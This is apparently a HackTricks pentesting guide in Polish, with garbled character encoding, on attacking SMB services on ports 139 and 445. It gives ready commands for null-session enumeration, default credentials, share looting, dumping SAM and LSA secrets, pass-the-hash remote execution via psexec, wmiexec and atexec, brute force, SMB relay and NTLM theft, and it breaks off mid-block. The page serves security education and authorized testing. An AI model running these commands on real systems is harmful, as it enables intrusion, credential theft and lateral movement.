# 139,445 - Testowanie penetracyjne SMB

<details>

<summary><strong>Nauka hakowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakowania, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>

## **Port 139**

_**System Podstawowego WejÅ›cia/WyjÅ›cia Sieciowego** (NetBIOS)_** (NetBIOS)** to protokÃ³Å‚ programowy zaprojektowany do umoÅ¼liwienia aplikacjom, komputerom i komputerom stacjonarnym w lokalnej sieci LAN (Local Area Network) interakcji z sprzÄ™tem sieciowym i **uÅ‚atwienia transmisji danych w sieci**. Identyfikacja i lokalizacja aplikacji dziaÅ‚ajÄ…cych w sieci NetBIOS sÄ… osiÄ…gane poprzez ich nazwy NetBIOS, ktÃ³re mogÄ… mieÄ‡ maksymalnie 16 znakÃ³w i czÄ™sto sÄ… odrÄ™bne od nazwy komputera. Sesja NetBIOS miÄ™dzy dwiema aplikacjami jest inicjowana, gdy jedna aplikacja (dziaÅ‚ajÄ…ca jako klient) wydaje polecenie "wywoÅ‚ania" innej aplikacji (dziaÅ‚ajÄ…cej jako serwer), korzystajÄ…c z **Portu TCP 139**.
```
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
```
## Port 445

Technicznie rzecz biorÄ…c, Port 139 jest okreÅ›lany jako â€NBT nad IPâ€, podczas gdy Port 445 jest identyfikowany jako â€SMB nad IPâ€. SkrÃ³t **SMB** oznacza â€**Server Message Blocks**â€, ktÃ³ry jest rÃ³wnieÅ¼ wspÃ³Å‚czeÅ›nie znany jako **Common Internet File System (CIFS)**. Jako protokÃ³Å‚ sieciowy warstwy aplikacji, SMB/CIFS jest gÅ‚Ã³wnie wykorzystywany do umoÅ¼liwienia wspÃ³Å‚dzielonego dostÄ™pu do plikÃ³w, drukarek, portÃ³w szeregowych oraz uÅ‚atwienia rÃ³Å¼nych form komunikacji miÄ™dzy wÄ™zÅ‚ami w sieci.

Na przykÅ‚ad, w kontekÅ›cie systemu Windows, zaznacza siÄ™, Å¼e SMB moÅ¼e dziaÅ‚aÄ‡ bezpoÅ›rednio nad TCP/IP, eliminujÄ…c koniecznoÅ›Ä‡ korzystania z NetBIOS nad TCP/IP, poprzez wykorzystanie portu 445. Natomiast, na innych systemach, zauwaÅ¼a siÄ™ uÅ¼ycie portu 139, co wskazuje, Å¼e SMB jest wykonywane w poÅ‚Ä…czeniu z NetBIOS nad TCP/IP.
```
445/tcp   open  microsoft-ds  Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
```
### SMB

ProtokÃ³Å‚ **Server Message Block (SMB)**, dziaÅ‚ajÄ…cy w modelu **klient-serwer**, jest przeznaczony do regulowania **dostÄ™pu do plikÃ³w**, katalogÃ³w i innych zasobÃ³w sieciowych, takich jak drukarki i routery. GÅ‚Ã³wnie wykorzystywany w serii systemÃ³w operacyjnych **Windows**, SMB zapewnia kompatybilnoÅ›Ä‡ wstecznÄ…, umoÅ¼liwiajÄ…c urzÄ…dzeniom z nowszymi wersjami systemu operacyjnego Microsoftu pÅ‚ynnÄ… interakcjÄ™ z urzÄ…dzeniami pracujÄ…cymi na starszych wersjach. Dodatkowo projekt **Samba** oferuje bezpÅ‚atne oprogramowanie, umoÅ¼liwiajÄ…c implementacjÄ™ SMB na systemach **Linux** i Unix, uÅ‚atwiajÄ…c tym samym komunikacjÄ™ miÄ™dzyplatformowÄ… za pomocÄ… SMB.

UdziaÅ‚y, reprezentujÄ…ce **dowolne czÄ™Å›ci lokalnego systemu plikÃ³w**, mogÄ… byÄ‡ udostÄ™pniane przez serwer SMB, sprawiajÄ…c, Å¼e hierarchia staje siÄ™ widoczna dla klienta czÄ™Å›ciowo **niezaleÅ¼nie** od rzeczywistej struktury serwera. **Listy kontroli dostÄ™pu (ACL)**, ktÃ³re definiujÄ… **prawa dostÄ™pu**, pozwalajÄ… na **dokÅ‚adnÄ… kontrolÄ™** nad uprawnieniami uÅ¼ytkownikÃ³w, w tym atrybutami takimi jak **`wykonaj`**, **`odczytaj`** i **`peÅ‚ny dostÄ™p`**. Te uprawnienia mogÄ… byÄ‡ przypisane do poszczegÃ³lnych uÅ¼ytkownikÃ³w lub grup, na podstawie udziaÅ‚Ã³w, i sÄ… odrÄ™bne od lokalnych uprawnieÅ„ ustawionych na serwerze.

### UdziaÅ‚ IPC$

DostÄ™p do udziaÅ‚u IPC$ moÅ¼na uzyskaÄ‡ za pomocÄ… anonimowej sesji null, umoÅ¼liwiajÄ…c interakcjÄ™ z usÅ‚ugami udostÄ™pnionymi za pomocÄ… nazwanych potokÃ³w. NarzÄ™dzie `enum4linux` jest przydatne w tym celu. Poprawnie wykorzystane, umoÅ¼liwia zdobycie:

* Informacji o systemie operacyjnym
* SzczegÃ³Å‚Ã³w na temat domeny nadrzÄ™dnej
* Kompilacji lokalnych uÅ¼ytkownikÃ³w i grup
* Informacji na temat dostÄ™pnych udziaÅ‚Ã³w SMB
* Efektywnej polityki bezpieczeÅ„stwa systemu

Ta funkcjonalnoÅ›Ä‡ jest kluczowa dla administratorÃ³w sieci i specjalistÃ³w ds. bezpieczeÅ„stwa do oceny postawy bezpieczeÅ„stwa usÅ‚ug SMB (Server Message Block) w sieci. `enum4linux` zapewnia kompleksowy widok Å›rodowiska SMB systemu docelowego, co jest istotne dla identyfikacji potencjalnych podatnoÅ›ci i zapewnienia wÅ‚aÅ›ciwego zabezpieczenia usÅ‚ug SMB.
```bash
enum4linux -a target_ip
```
PowyÅ¼sza komenda jest przykÅ‚adem, jak `enum4linux` moÅ¼e byÄ‡ uÅ¼yty do przeprowadzenia peÅ‚nej enumeracji przeciwko okreÅ›lonemu celowi okreÅ›lonemu przez `target_ip`.

## Co to jest NTLM

JeÅ›li nie wiesz, co to jest NTLM, lub chcesz dowiedzieÄ‡ siÄ™, jak dziaÅ‚a i jak moÅ¼na to wykorzystaÄ‡, znajdziesz bardzo interesujÄ…cÄ… tÄ™ stronÄ™ o **NTLM**, gdzie jest wyjaÅ›nione **jak dziaÅ‚a ten protokÃ³Å‚ i jak moÅ¼esz z tego skorzystaÄ‡:**

{% content-ref url="../../windows-hardening/ntlm/" %}
[ntlm](../../windows-hardening/ntlm/)
{% endcontent-ref %}

## **Enumeracja serwera**

### **Skanuj** sieÄ‡ w poszukiwaniu hostÃ³w:
```bash
nbtscan -r 192.168.0.1/24
```
### Wersja serwera SMB

Aby znaleÅºÄ‡ potencjalne wykorzystania wersji SMB, waÅ¼ne jest, aby wiedzieÄ‡, ktÃ³ra wersja jest uÅ¼ywana. JeÅ›li tej informacji nie ma w innych uÅ¼ywanych narzÄ™dziach, moÅ¼esz:

* UÅ¼yÄ‡ moduÅ‚u pomocniczego **MSF** \_**auxiliary/scanner/smb/smb\_version**
* Lub ten skrypt:
```bash
#!/bin/sh
#Author: rewardone
#Description:
# Requires root or enough permissions to use tcpdump
# Will listen for the first 7 packets of a null login
# and grab the SMB Version
#Notes:
# Will sometimes not capture or will print multiple
# lines. May need to run a second time for success.
if [ -z $1 ]; then echo "Usage: ./smbver.sh RHOST {RPORT}" && exit; else rhost=$1; fi
if [ ! -z $2 ]; then rport=$2; else rport=139; fi
tcpdump -s0 -n -i tap0 src $rhost and port $rport -A -c 7 2>/dev/null | grep -i "samba\|s.a.m" | tr -d '.' | grep -oP 'UnixSamba.*[0-9a-z]' | tr -d '\n' & echo -n "$rhost: " &
echo "exit" | smbclient -L $rhost 1>/dev/null 2>/dev/null
echo "" && sleep .1
```
### **Wyszukiwanie exploitÃ³w**
```bash
msf> search type:exploit platform:windows target:2008 smb
searchsploit microsoft smb
```
### **MoÅ¼liwe** dane uwierzytelniajÄ…ce

| **Nazwa uÅ¼ytkownika** | **Powszechne hasÅ‚a**                      |
| -------------------- | ----------------------------------------- |
| _(puste)_            | _(puste)_                                 |
| goÅ›Ä‡                 | _(puste)_                                 |
| Administrator, admin | _(puste)_, hasÅ‚o, administrator, admin    |
| arcserve             | arcserve, backup                          |
| tivoli, tmersrvd     | tivoli, tmersrvd, admin                   |
| backupexec, backup   | backupexec, backup, arcada                |
| test, lab, demo      | hasÅ‚o, test, lab, demo                    |

### Atak siÅ‚owy

* [**Atak siÅ‚owy na SMB**](../../generic-methodologies-and-resources/brute-force.md#smb)

### Informacje o Å›rodowisku SMB

### Pozyskanie informacji
```bash
#Dump interesting information
enum4linux -a [-u "<username>" -p "<passwd>"] <IP>
enum4linux-ng -A [-u "<username>" -p "<passwd>"] <IP>
nmap --script "safe or smb-enum-*" -p 445 <IP>

#Connect to the rpc
rpcclient -U "" -N <IP> #No creds
rpcclient //machine.htb -U domain.local/USERNAME%754d87d42adabcca32bdb34a876cbffb  --pw-nt-hash
rpcclient -U "username%passwd" <IP> #With creds
#You can use querydispinfo and enumdomusers to query user information

#Dump user information
/usr/share/doc/python3-impacket/examples/samrdump.py -port 139 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/samrdump.py -port 445 [[domain/]username[:password]@]<targetName or address>

#Map possible RPC endpoints
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 135 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 139 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 445 [[domain/]username[:password]@]<targetName or address>
```
### Wylicz UÅ¼ytkownikÃ³w, Grupy i Zalogowanych UÅ¼ytkownikÃ³w

Te informacje powinny byÄ‡ juÅ¼ zbierane za pomocÄ… enum4linux i enum4linux-ng
```bash
crackmapexec smb 10.10.10.10 --users [-u <username> -p <password>]
crackmapexec smb 10.10.10.10 --groups [-u <username> -p <password>]
crackmapexec smb 10.10.10.10 --groups --loggedon-users [-u <username> -p <password>]

ldapsearch -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "(&(objectclass=user))" -h 10.10.10.10 | grep -i samaccountname: | cut -f 2 -d " "

rpcclient -U "" -N 10.10.10.10
enumdomusers
enumdomgroups
```
### Wylicz lokalnych uÅ¼ytkownikÃ³w

[Impacket](https://github.com/fortra/impacket/blob/master/examples/lookupsid.py)
```bash
lookupsid.py -no-pass hostname.local
```
Jednolinijkowiec
```bash
for i in $(seq 500 1100);do rpcclient -N -U "" 10.10.10.10 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
```
### Metasploit - Wylicz lokalnych uÅ¼ytkownikÃ³w
```bash
use auxiliary/scanner/smb/smb_lookupsid
set rhosts hostname.local
run
```
### **Wyliczanie LSARPC i SAMR rpcclient**

{% content-ref url="rpcclient-enumeration.md" %}
[rpcclient-enumeration.md](rpcclient-enumeration.md)
{% endcontent-ref %}

### PoÅ‚Ä…czenie GUI z systemem Linux

#### W terminalu:

`xdg-open smb://cascade.htb/`

#### W oknie przeglÄ…darki plikÃ³w (nautilus, thunar, itp.)

`smb://friendzone.htb/general/`

## Wyliczanie udostÄ™pnionych folderÃ³w

### Lista udostÄ™pnionych folderÃ³w

Zawsze zaleca siÄ™ sprawdzenie, czy moÅ¼na uzyskaÄ‡ dostÄ™p do czegokolwiek, jeÅ›li nie masz poÅ›wiadczeÅ„, sprÃ³buj uÅ¼yÄ‡ **pustych poÅ›wiadczeÅ„/uÅ¼ytkownika goÅ›cia**.
```bash
smbclient --no-pass -L //<IP> # Null user
smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash

smbmap -H <IP> [-P <PORT>] #Null user
smbmap -u "username" -p "password" -H <IP> [-P <PORT>] #Creds
smbmap -u "username" -p "<NT>:<LM>" -H <IP> [-P <PORT>] #Pass-the-Hash
smbmap -R -u "username" -p "password" -H <IP> [-P <PORT>] #Recursive list

crackmapexec smb <IP> -u '' -p '' --shares #Null user
crackmapexec smb <IP> -u 'username' -p 'password' --shares #Guest user
crackmapexec smb <IP> -u 'username' -H '<HASH>' --shares #Guest user
```
### **PoÅ‚Ä…czenie/Listowanie wspÃ³Å‚dzielonego folderu**
```bash
#Connect using smbclient
smbclient --no-pass //<IP>/<Folder>
smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash
#Use --no-pass -c 'recurse;ls'  to list recursively with smbclient

#List with smbmap, without folder it list everything
smbmap [-u "username" -p "password"] -R [Folder] -H <IP> [-P <PORT>] # Recursive list
smbmap [-u "username" -p "password"] -r [Folder] -H <IP> [-P <PORT>] # Non-Recursive list
smbmap -u "username" -p "<NT>:<LM>" [-r/-R] [Folder] -H <IP> [-P <PORT>] #Pass-the-Hash
```
### **RÄ™czne wyliczanie udziaÅ‚Ã³w systemu Windows i Å‚Ä…czenie siÄ™ z nimi**

MoÅ¼e siÄ™ zdarzyÄ‡, Å¼e jesteÅ› ograniczony w wyÅ›wietlaniu udziaÅ‚Ã³w hosta i gdy prÃ³bujesz je wymieniÄ‡, wydaje siÄ™, Å¼e nie ma Å¼adnych udziaÅ‚Ã³w do poÅ‚Ä…czenia. Dlatego warto sprÃ³bowaÄ‡ rÄ™cznie poÅ‚Ä…czyÄ‡ siÄ™ z udziaÅ‚em. Aby rÄ™cznie wyliczyÄ‡ udziaÅ‚y, moÅ¼esz szukaÄ‡ odpowiedzi takich jak NT\_STATUS\_ACCESS\_DENIED i NT\_STATUS\_BAD\_NETWORK\_NAME, gdy uÅ¼ywasz waÅ¼nej sesji (np. pustej sesji lub waÅ¼nych poÅ›wiadczeÅ„). MogÄ… one wskazywaÄ‡, czy udziaÅ‚ istnieje i nie masz do niego dostÄ™pu, czy teÅ¼ udziaÅ‚ w ogÃ³le nie istnieje.

Powszechne nazwy udziaÅ‚Ã³w dla celÃ³w systemÃ³w Windows to

* C$
* D$
* ADMIN$
* IPC$
* PRINT$
* FAX$
* SYSVOL
* NETLOGON

(Powszechne nazwy udziaÅ‚Ã³w z _**Network Security Assessment 3rd edition**_)

MoÅ¼esz sprÃ³bowaÄ‡ poÅ‚Ä…czyÄ‡ siÄ™ z nimi, uÅ¼ywajÄ…c nastÄ™pujÄ…cej komendy
```bash
smbclient -U '%' -N \\\\<IP>\\<SHARE> # null session to connect to a windows share
smbclient -U '<USER>' \\\\<IP>\\<SHARE> # authenticated session to connect to a windows share (you will be prompted for a password)
```
lub ten skrypt (korzystajÄ…cy z pustej sesji)
```bash
#/bin/bash

ip='<TARGET-IP-HERE>'
shares=('C$' 'D$' 'ADMIN$' 'IPC$' 'PRINT$' 'FAX$' 'SYSVOL' 'NETLOGON')

for share in ${shares[*]}; do
output=$(smbclient -U '%' -N \\\\$ip\\$share -c '')

if [[ -z $output ]]; then
echo "[+] creating a null session is possible for $share" # no output if command goes through, thus assuming that a session was created
else
echo $output # echo error message (e.g. NT_STATUS_ACCESS_DENIED or NT_STATUS_BAD_NETWORK_NAME)
fi
done
```
PrzykÅ‚ady
```bash
smbclient -U '%' -N \\\\192.168.0.24\\im_clearly_not_here # returns NT_STATUS_BAD_NETWORK_NAME
smbclient -U '%' -N \\\\192.168.0.24\\ADMIN$ # returns NT_STATUS_ACCESS_DENIED or even gives you a session
```
### **Wyliczanie udziaÅ‚Ã³w z systemu Windows / bez uÅ¼ycia narzÄ™dzi innych firm**

PowerShell
```powershell
# Retrieves the SMB shares on the locale computer.
Get-SmbShare
Get-WmiObject -Class Win32_Share
# Retrieves the SMB shares on a remote computer.
get-smbshare -CimSession "<computer name or session object>"
# Retrieves the connections established from the local SMB client to the SMB servers.
Get-SmbConnection
```
Konsola CMD
```shell
# List shares on the local computer
net share
# List shares on a remote computer (including hidden ones)
net view \\<ip> /all
```
### MMC Snap-in (graficzny)
```shell
# Shared Folders: Shared Folders > Shares
fsmgmt.msc
# Computer Management: Computer Management > System Tools > Shared Folders > Shares
compmgmt.msc
```
explorer.exe (graficzny), wpisz `\\<ip>\` aby zobaczyÄ‡ dostÄ™pne nieukryte udziaÅ‚y.

### Zamontuj udostÄ™pniony folder
```bash
mount -t cifs //x.x.x.x/share /mnt/share
mount -t cifs -o "username=user,password=password" //x.x.x.x/share /mnt/share
```
### **Pobieranie plikÃ³w**

Przeczytaj poprzednie sekcje, aby dowiedzieÄ‡ siÄ™, jak poÅ‚Ä…czyÄ‡ siÄ™ za pomocÄ… poÅ›wiadczeÅ„/Pass-the-Hash.
```bash
#Search a file and download
sudo smbmap -R Folder -H <IP> -A <FileName> -q # Search the file in recursive mode and download it inside /usr/share/smbmap
```

```bash
#Download all
smbclient //<IP>/<share>
> mask ""
> recurse
> prompt
> mget *
#Download everything to current directory
```
### Wyszukiwanie wspÃ³Å‚dzielonych folderÃ³w domenowych

* [**Snaffler**](https://github.com/SnaffCon/Snaffler)\*\*\*\*

Komendy:

* mask: okreÅ›la maskÄ™ uÅ¼ywanÄ… do filtrowania plikÃ³w w katalogu (np. "" dla wszystkich plikÃ³w)
* recurse: przeÅ‚Ä…cza rekursjÄ™ (domyÅ›lnie: wyÅ‚Ä…czone)
* prompt: wyÅ‚Ä…cza pytanie o nazwy plikÃ³w (domyÅ›lnie: wÅ‚Ä…czone)
* mget: kopiuje wszystkie pliki pasujÄ…ce do maski z hosta na maszynÄ™ klienta

(_Informacje z manpage smbclient_)
```bash
Snaffler.exe -s -d domain.local -o snaffler.log -v data
```
* [**CrackMapExec**](https://wiki.porchetta.industries/smb-protocol/spidering-shares) spider.
* `-M spider_plus [--share <share_name>]`
* `--pattern txt`
```bash
sudo crackmapexec smb 10.10.10.10 -u username -p pass -M spider_plus --share 'Department Shares'
```
SzczegÃ³lnie interesujÄ…ce sÄ… pliki o nazwie **`Registry.xml`**, poniewaÅ¼ **mogÄ… zawieraÄ‡ hasÅ‚a** dla uÅ¼ytkownikÃ³w skonfigurowanych z **autologon** za poÅ›rednictwem zasad grupy. Lub pliki **`web.config`**, poniewaÅ¼ zawierajÄ… poÅ›wiadczenia.

{% hint style="info" %}
UdziaÅ‚ **SYSVOL** jest **do odczytu** przez wszystkich uwierzytelnionych uÅ¼ytkownikÃ³w w domenie. W nim moÅ¼esz **znaleÅºÄ‡** wiele rÃ³Å¼nych skryptÃ³w wsadowych, skryptÃ³w VBScript i PowerShell.\
PowinieneÅ› **sprawdziÄ‡** zawarte w nim **skrypty**, poniewaÅ¼ moÅ¼esz **znaleÅºÄ‡** wraÅ¼liwe informacje, takie jak **hasÅ‚a**.
{% endhint %}

## Odczytaj rejestr

MoÅ¼esz byÄ‡ w stanie **odczytaÄ‡ rejestr** za pomocÄ… odkrytych poÅ›wiadczeÅ„. Impacket **`reg.py`** pozwala Ci to wyprÃ³bowaÄ‡:
```bash
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKU -s
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKCU -s
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKLM -s
```
## Post Exploitation

DomyÅ›lna konfiguracja serwera **Samba** zazwyczaj znajduje siÄ™ w `/etc/samba/smb.conf` i moÅ¼e zawieraÄ‡ kilka **niebezpiecznych konfiguracji**:

| **Ustawienie**              | **Opis**                                                             |
| --------------------------- | ------------------------------------------------------------------- |
| `browseable = yes`          | Czy zezwoliÄ‡ na wyÅ›wietlanie dostÄ™pnych zasobÃ³w w bieÅ¼Ä…cym udziale? |
| `read only = no`            | Czy zabroniÄ‡ tworzenia i modyfikowania plikÃ³w?                      |
| `writable = yes`            | Czy zezwoliÄ‡ uÅ¼ytkownikom na tworzenie i modyfikowanie plikÃ³w?      |
| `guest ok = yes`            | Czy zezwoliÄ‡ na poÅ‚Ä…czenie z usÅ‚ugÄ… bez uÅ¼ycia hasÅ‚a?               |
| `enable privileges = yes`   | Czy honorowaÄ‡ przywileje przypisane do konkretnego SID?             |
| `create mask = 0777`        | Jakie uprawnienia naleÅ¼y przypisaÄ‡ do nowo utworzonych plikÃ³w?      |
| `directory mask = 0777`     | Jakie uprawnienia naleÅ¼y przypisaÄ‡ do nowo utworzonych katalogÃ³w?   |
| `logon script = script.sh`  | Jaki skrypt ma byÄ‡ wykonany podczas logowania uÅ¼ytkownika?          |
| `magic script = script.sh`  | KtÃ³ry skrypt powinien byÄ‡ wykonany po zamkniÄ™ciu skryptu?           |
| `magic output = script.out` | Gdzie naleÅ¼y przechowywaÄ‡ wynik magicznego skryptu?                 |

Polecenie `smbstatus` dostarcza informacji o **serwerze** i o **podÅ‚Ä…czonych uÅ¼ytkownikach**.

## Uwierzytelnianie za pomocÄ… Kerberosa

MoÅ¼esz **uwierzytelniÄ‡** siÄ™ do **Kerberosa** za pomocÄ… narzÄ™dzi **smbclient** i **rpcclient**:
```bash
smbclient --kerberos //ws01win10.domain.com/C$
rpcclient -k ws01win10.domain.com
```
## **Wykonaj polecenia**

### **crackmapexec**

crackmapexec moÅ¼e wykonywaÄ‡ polecenia **wykorzystujÄ…c** dowolnÄ… z metod **mmcexec, smbexec, atexec, wmiexec**, przy czym metoda **wmiexec** jest metodÄ… **domyÅ›lnÄ…**. MoÅ¼esz wskazaÄ‡, ktÃ³rÄ… opcjÄ™ chcesz uÅ¼yÄ‡, korzystajÄ…c z parametru `--exec-method`:
```bash
apt-get install crackmapexec

crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable' #Execute Powershell
crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami #Excute cmd
crackmapexec smb 192.168.10.11 -u Administrator -H <NTHASH> -x whoami #Pass-the-Hash
# Using --exec-method {mmcexec,smbexec,atexec,wmiexec}

crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sam #Dump SAM
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --lsa #Dump LSASS in memmory hashes
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sessions #Get sessions (
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --loggedon-users #Get logged-on users
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --disks #Enumerate the disks
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --users #Enumerate users
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --groups # Enumerate groups
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --local-groups # Enumerate local groups
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --pass-pol #Get password policy
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --rid-brute #RID brute

crackmapexec smb <IP> -d <DOMAIN> -u Administrator -H <HASH> #Pass-The-Hash
```
### [**psexec**](../../windows-hardening/lateral-movement/psexec-and-winexec.md)**/**[**smbexec**](../../windows-hardening/lateral-movement/smbexec.md)

Obie opcje **tworzÄ… nowÄ… usÅ‚ugÄ™** (korzystajÄ…c z _\pipe\svcctl_ przez SMB) na maszynie ofiary i uÅ¼ywajÄ… jej do **wykonania czegoÅ›** (**psexec** **przeÅ›le** plik wykonywalny do udziaÅ‚u ADMIN$ i **smbexec** wskaÅ¼e **cmd.exe/powershell.exe** i umieÅ›ci w argumentach Å‚adunek --**technika bez pliku-**-).\
**WiÄ™cej informacji** o [**psexec**](../../windows-hardening/lateral-movement/psexec-and-winexec.md) i [**smbexec**](../../windows-hardening/lateral-movement/smbexec.md).\
W **kali** znajduje siÄ™ w /usr/share/doc/python3-impacket/examples/
```bash
#If no password is provided, it will be prompted
./psexec.py [[domain/]username[:password]@]<targetName or address>
./psexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash
psexec \\192.168.122.66 -u Administrator -p 123456Ww
psexec \\192.168.122.66 -u Administrator -p q23q34t34twd3w34t34wtw34t # Use pass the hash
```
Za pomocÄ… **parametru** `-k` moÅ¼esz uwierzytelniÄ‡ siÄ™ przy uÅ¼yciu **kerberosa** zamiast **NTLM**

### [wmiexec](../../windows-hardening/lateral-movement/wmicexec.md)/dcomexec

BezgÅ‚oÅ›nie wykonaj powÅ‚okÄ™ poleceÅ„, nie dotykajÄ…c dysku ani nie uruchamiajÄ…c nowej usÅ‚ugi, korzystajÄ…c z DCOM przez **port 135.**\
W **kali** znajduje siÄ™ w /usr/share/doc/python3-impacket/examples/
```bash
#If no password is provided, it will be prompted
./wmiexec.py [[domain/]username[:password]@]<targetName or address> #Prompt for password
./wmiexec.py -hashes LM:NT administrator@10.10.10.103 #Pass-the-Hash
#You can append to the end of the command a CMD command to be executed, if you dont do that a semi-interactive shell will be prompted
```
Za pomocÄ… **parametru** `-k` moÅ¼esz uwierzytelniÄ‡ siÄ™ przy uÅ¼yciu **kerberosa** zamiast **NTLM**.
```bash
#If no password is provided, it will be prompted
./dcomexec.py [[domain/]username[:password]@]<targetName or address>
./dcomexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash
#You can append to the end of the command a CMD command to be executed, if you dont do that a semi-interactive shell will be prompted
```
### [AtExec](../../windows-hardening/lateral-movement/atexec.md)

Wykonaj polecenia za pomocÄ… Harmonogramu zadaÅ„ (korzystajÄ…c z _\pipe\atsvc_ przez SMB).\
W **kali** znajduje siÄ™ w /usr/share/doc/python3-impacket/examples/
```bash
./atexec.py [[domain/]username[:password]@]<targetName or address> "command"
./atexec.py -hashes <LM:NT> administrator@10.10.10.175 "whoami"
```
## OdnoÅ›nik do Impacket

[https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/)

## **PrÃ³ba zÅ‚amania poÅ›wiadczeÅ„ uÅ¼ytkownikÃ³w**

**Nie jest to zalecane, moÅ¼esz zablokowaÄ‡ konto, jeÅ›li przekroczysz maksymalnÄ… dozwolonÄ… liczbÄ™ prÃ³b**
```bash
nmap --script smb-brute -p 445 <IP>
ridenum.py <IP> 500 50000 /root/passwds.txt #Get usernames bruteforcing that rids and then try to bruteforce each user name
```
## Atak SMB relay

Ten atak wykorzystuje narzÄ™dzie Responder do **przechwytywania sesji uwierzytelniania SMB** w sieci wewnÄ™trznej i **przekazywania** ich do **maszyny docelowej**. JeÅ›li sesja uwierzytelniania **zakoÅ„czy siÄ™ sukcesem**, automatycznie zostaniesz przeniesiony do **powÅ‚oki systemowej**.\
[**WiÄ™cej informacji o tym ataku tutaj.**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

## SMB-Trap

Biblioteka systemu Windows URLMon.dll automatycznie prÃ³buje uwierzytelnienia do hosta, gdy strona prÃ³buje uzyskaÄ‡ dostÄ™p do pewnej zawartoÅ›ci za pomocÄ… SMB, na przykÅ‚ad: `img src="\\10.10.10.10\path\image.jpg"`

Zdarza siÄ™ to przy uÅ¼yciu funkcji:

* URLDownloadToFile
* URLDownloadToCache
* URLOpenStream
* URLOpenBlockingStream

KtÃ³re sÄ… uÅ¼ywane przez niektÃ³re przeglÄ…darki i narzÄ™dzia (np. Skype)

![Å¹rÃ³dÅ‚o: http://www.elladodelmal.com/2017/02/como-hacer-ataques-smbtrap-windows-con.html](<../../.gitbook/assets/image (355).png>)

### SMBTrap przy uÅ¼yciu MitMf

![Å¹rÃ³dÅ‚o: http://www.elladodelmal.com/2017/02/como-hacer-ataques-smbtrap-windows-con.html](<../../.gitbook/assets/image (889).png>)

## KradzieÅ¼ NTLM

Podobnie jak w przypadku PuÅ‚apki SMB, umieszczenie zÅ‚oÅ›liwych plikÃ³w na systemie docelowym (za pomocÄ… SMB, na przykÅ‚ad) moÅ¼e spowodowaÄ‡ prÃ³bÄ™ uwierzytelnienia SMB, umoÅ¼liwiajÄ…c przechwycenie hasha NetNTLMv2 za pomocÄ… narzÄ™dzia takiego jak Responder. NastÄ™pnie hash moÅ¼na zÅ‚amaÄ‡ offline lub uÅ¼yÄ‡ go w [ataku SMB relay](./#smb-relay-attack).

[Zobacz: ntlm\_theft](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#ntlm\_theft)

## Automatyczne polecenia HackTricks
```
Protocol_Name: SMB    #Protocol Abbreviation if there is one.
Port_Number:  137,138,139     #Comma separated if there is more than one.
Protocol_Description: Server Message Block         #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for SMB
Note: |
